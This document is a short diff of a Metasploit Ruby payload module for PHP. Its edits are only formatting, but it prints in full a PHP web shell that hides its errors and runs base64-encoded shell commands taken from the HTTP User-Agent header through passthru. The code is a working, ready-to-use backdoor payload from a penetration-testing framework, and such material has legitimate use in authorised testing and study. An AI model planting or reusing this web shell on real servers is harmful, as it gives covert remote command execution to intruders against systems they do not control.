@@ -14,13 +14,13 @@ module Metasploit3
 			'Author'        => [ 'binghe911' ],
 			'License'       => BSD_LICENSE,
 			'Platform'      => 'php',
-			'Arch'          => ARCH_PHP
-			))                                           
+			'Arch'          => ARCH_PHP,
+			))                                             
 	end
 	def php_shell
 		shell = <<-END_OF_PHP_CODE
 		<?php error_reporting(0);print(_code_);passthru(base64_decode(\$_SERVER[HTTP_USER_AGENT]));die; ?>
-		END_OF_PHP_CODE                                 
+		END_OF_PHP_CODE
 		return Rex::Text.compress(shell)
 	end
 	#
@@ -30,3 +30,4 @@ module Metasploit3
 		return php_shell
 	end
 end
+
